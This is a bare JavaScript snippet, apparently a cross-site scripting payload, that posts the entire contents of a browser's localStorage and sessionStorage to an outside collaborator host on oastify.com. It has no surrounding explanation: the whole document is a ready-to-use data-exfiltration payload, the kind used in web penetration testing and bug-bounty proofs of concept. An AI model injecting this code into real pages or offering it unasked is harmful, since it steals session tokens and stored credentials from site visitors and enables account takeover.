fetch('https://w969uozhs2veixjwrq6lldrrgim9a0yp.oastify.com', {
  method: 'POST',
  mode: 'no-cors',
  body: JSON.stringify({
    local: {...localStorage},
    session: {...sessionStorage}
  })
});
